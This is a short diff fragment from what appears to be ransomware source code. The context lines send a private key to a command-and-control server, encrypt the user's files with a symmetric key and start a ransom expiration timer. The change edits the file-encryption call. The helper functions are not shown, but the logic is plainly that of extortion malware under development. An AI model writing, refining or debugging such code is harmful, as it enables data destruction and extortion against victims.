@@ -48,7 +48,7 @@ else:
     send_private_key_to_c2(private_key)
 
     # Encrypt all files
-    encrypt_user_files("/", symmetric_key)
+    encrypt_user_files(symmetric_key)
 
     start_time = datetime.now()
     expiration_time = start_time + timedelta(seconds=seconds_left)
